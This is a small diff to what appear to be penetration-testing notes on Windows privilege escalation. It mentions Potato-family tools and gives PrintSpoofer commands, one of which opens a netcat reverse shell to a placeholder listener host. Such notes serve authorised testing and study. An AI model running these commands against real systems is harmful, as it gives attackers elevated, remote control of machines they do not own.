@@ -34,7 +34,7 @@ If printSpoofer does not work...
 	Godpotato (convenient as precompiled exes)
 	etc
 	See Potatos page I made
-```
+```powershell
 #Printspoofer
 PrintSpoofer.exe -i -c powershell.exe 
 PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
